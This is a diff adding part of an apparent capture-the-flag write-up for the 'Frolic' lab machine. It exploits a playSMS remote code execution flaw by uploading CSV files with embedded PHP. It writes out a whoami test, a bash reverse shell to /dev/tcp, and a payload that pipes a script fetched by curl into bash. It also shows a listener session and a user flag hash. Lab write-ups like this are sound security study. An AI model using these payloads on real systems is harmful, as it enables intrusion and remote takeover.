@@ -249,5 +249,54 @@
 
     idkwhatispass
 
-// 
+// Now we can login to http://10.10.10.111:9999/playsms/ with: 
 
+    admin : idkwhatispass
+
+// Searhing in ExploitDB , found [Remote Code Execution Vulnerability](https://www.exploit-db.com/exploits/42044)
+
+// Following the exploit , Make a .csv file with php code 
+
+    $ cat backdoor.csv 
+    <?php echo exec('whoami'); ?>,1
+
+// Navigate to 'My Account' >> 'Send from file'
+
+![Image 20]()
+
+// Upload the file and its work !
+
+![Image 21]()
+
+// Now we can make a reverse shell
+
+    $ cat revshell 
+    bash -i >& /dev/tcp/10.10.16.232/1444 0>&1
+
+// We will upload the shell with python http server 
+
+    $ python3 -m http.server 1445
+    Serving HTTP on 0.0.0.0 port 1445 (http://0.0.0.0:1445/) ...
+
+// The upload file
+
+    $ cat backdoor2.csv
+    <?php echo exec('curl http://10.10.16.232:1445/revshell | bash'); ?>,1
+
+// Open a listiner with nc on port 1444 and upload backdoor2.csv file
+
+    $ rlwrap nc -lvnp 1444
+    listening on [any] 1444 ...
+    connect to [10.10.16.232] from (UNKNOWN) [10.10.10.111] 45400
+    bash: cannot set terminal process group (1227): Inappropriate ioctl for device
+    bash: no job control in this shell
+
+    www-data@frolic:~/html/playsms$ id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+// We got a shell !! And user flag !
+
+    www-data@frolic:/home/ayush$ cat user.txt
+    2ab95909cf509f85a6f476b59a0c2fe0
+
+//
